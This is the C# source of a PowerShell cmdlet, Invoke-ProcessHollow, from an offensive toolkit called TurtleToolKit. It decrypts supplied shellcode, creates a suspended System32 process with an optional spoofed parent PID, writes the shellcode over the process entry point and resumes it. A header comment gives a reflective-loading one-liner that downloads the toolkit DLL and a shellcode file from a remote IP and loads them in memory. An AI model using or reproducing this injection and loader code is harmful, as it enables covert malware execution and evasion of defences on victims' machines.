using System;
using System.Management.Automation;
using TurtleToolKitCrypt;
using System.Runtime.InteropServices;
using TurtleToolKitOutputs;
/*

reflective powershell load
$dll = $(IWR -Uri 'http://10.0.0.69/TurtleToolKit.dll').Content
$Assembly = [System.Reflection.Assembly]::Load($dll)
import-module -Assembly $Assembly                                              
Invoke-ClassicInjection

$responseObj = Invoke-EncryptShellcode -shellcode $(IWR -Uri 'http://ip/shellcode.bin' -usebasicparsing).Content

*/

namespace TurtleToolKit
{
    [Cmdlet(VerbsLifecycle.Invoke,"ProcessHollow")] // <- seeting cmdlet name and verbs
    [Alias("INVPH")] //<- cmdlet alias
    //[OutputType(typeof(ProcessHollowOutput))]       // <-- setting output type
    public class InvokeProcessHollow: Cmdlet
    {
        // to accept pipeline parameters
        // [Parameter(ValueFromPipelineByPropertyName = true)]
        // public bool PhysicalAdapter { get; set; }
        //
        //
        // Setting parameters for cmdlet
        [Parameter(Mandatory = true)] [Alias("pn")] public string procName { get; set; }
        /// PROCESS NAME WILL NEED TO BE IN SYSTEM32 DIRECTORY
        [Parameter(Mandatory = true)] [Alias("k")] public byte[] decryptKey { get; set; }
        [Parameter(Mandatory = true)] [Alias("encsh")] public byte[] shellCode { get; set; }
        [Parameter(Mandatory = true)] [Alias("ivk")] public byte[] initVector { get; set; }
        [Parameter(Mandatory = false)] [Alias("pp")] public int ppid = 0;
        // Done setting cmdlet parameters

        // setting class parameters
        private Cryptor cryptObj;
        // Init cmdlet
        public static SuccessObject success = new SuccessObject { Success = false };
        protected override void BeginProcessing()
        {
            base.BeginProcessing();
            cryptObj = new Cryptor(decryptKey, initVector);
        }

        // Process each item in pipeline
        protected override void ProcessRecord()
        {
            base.ProcessRecord();
            // if no pipeline shellcode obj passed use cmdlet parameters
            if (!ExecuteProcessHollow(cryptObj, shellCode, procName,ppid))
            {
                WriteWarning("Failed to execute process hollow");
                return;
            }
            success.Success = true;
            return;
        }

        // EndProcessing Used to clean up cmdlet
        protected override void EndProcessing(){
            base.EndProcessing();
            WriteObject(success);
        }
        // Handle abnormal termination
        protected override void StopProcessing(){ base.StopProcessing();}

        private IntPtr ReturnThreadAttribute(int ppid)
        {
            IntPtr ipSize = IntPtr.Zero;
            bool res = TurtleToolKitManaged.Win32.InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref ipSize);
            if (ipSize == IntPtr.Zero)
                return IntPtr.Zero;
            IntPtr lpAttributeList = Marshal.AllocHGlobal(ipSize);
            if (lpAttributeList == IntPtr.Zero)
                return IntPtr.Zero;
            res = TurtleToolKitManaged.Win32.InitializeProcThreadAttributeList(lpAttributeList, 1, 0, ref ipSize);
            if (!res)
                return IntPtr.Zero;
            IntPtr parentHandle = TurtleToolKitManaged.Win32.OpenProcess(0x001F0FFF, false, ppid);
            if (parentHandle == IntPtr.Zero)
                return IntPtr.Zero;
            WriteVerbose(":: Successfully spoofed ppid :::");
            IntPtr lpValue = IntPtr.Zero;
            lpValue = Marshal.AllocHGlobal(IntPtr.Size);
            Marshal.WriteIntPtr(lpValue, parentHandle);
            bool success = TurtleToolKitManaged.Win32.UpdateProcThreadAttribute(lpAttributeList, 0, (IntPtr)0x00020000,lpValue, (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero);
            if (!success)
                return IntPtr.Zero;
            return lpAttributeList;
        }
        private bool ExecuteProcessHollow(Cryptor crypt, byte[]payloadBytes, string processName,int ppid)
        {

            TurtleToolKitManaged.Win32.STARTUPINFO si = new TurtleToolKitManaged.Win32.STARTUPINFO();
            TurtleToolKitManaged.Win32.STARTUPINFOEX siEx = new TurtleToolKitManaged.Win32.STARTUPINFOEX();
            si.cb = Marshal.SizeOf(siEx);
            siEx.StartupInfo = si;
            TurtleToolKitManaged.Win32.PROCESS_INFORMATION pi = new TurtleToolKitManaged.Win32.PROCESS_INFORMATION();
            string path = "C:\\windows\\system32\\" + processName;
            if (ppid != 0)
            {
                // add parent pid
                IntPtr lpAttributeList = ReturnThreadAttribute(ppid);
                if (lpAttributeList == IntPtr.Zero)
                {
                    WriteWarning("ppid spoof failed");
                    return false;
                }
                siEx.lpAttributeList = lpAttributeList;
                bool res = CreateProcess(null, path, IntPtr.Zero, IntPtr.Zero, false, 0x08080004, IntPtr.Zero, null, ref siEx, out pi);
            } else
            {
                bool res = TurtleToolKitManaged.Win32.CreateProcess(null, path, IntPtr.Zero, IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);
            }
            TurtleToolKitManaged.Win32.PROCESS_BASIC_INFORMATION bi = new TurtleToolKitManaged.Win32.PROCESS_BASIC_INFORMATION();
            uint tmp = 0;
            IntPtr hProcess = pi.hProcess;

            TurtleToolKitManaged.Win32.ZwQueryInformationProcess(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);
            IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebAddress + 0x10);

            byte[] addrBuf = new byte[IntPtr.Size];
            IntPtr nRead = IntPtr.Zero;

            TurtleToolKitManaged.Win32.ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);
            IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));

            byte[] data = new byte[0x200];
            TurtleToolKitManaged.Win32.ReadProcessMemory(hProcess, svchostBase, data, data.Length, out nRead);
            uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);
            uint opthdr = e_lfanew_offset + 0x28;
            uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);
            IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);

            var decryptedBytes = crypt.DecryptBytes(payloadBytes);
            if (decryptedBytes == null)
            {
                WriteWarning("Failed to decrypt bytes");
                return false;
            }
            // Perform Decrypt heres
            TurtleToolKitManaged.Win32.WriteProcessMemory(hProcess, addressOfEntryPoint, decryptedBytes, decryptedBytes.Length, out nRead);
            TurtleToolKitManaged.Win32.ResumeThread(pi.Thread);
            WriteVerbose("::: Successfully Execute ProcessHollow via -> " + processName + " :::");
            return true;
        }
        //create process
        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        private static extern bool CreateProcess(
           string lpApplicationName,
           string lpCommandLine,
           IntPtr lpProcessAttributes,
           IntPtr lpThreadAttributes,
           bool bInheritHandles,
           uint dwCreationFlags,
           IntPtr lpEnvironment,
           string lpCurrentDirectory,
           [In] ref TurtleToolKitManaged.Win32.STARTUPINFOEX lpStartupInfo,
           out TurtleToolKitManaged.Win32.PROCESS_INFORMATION lpProcessInformation);
    }
}
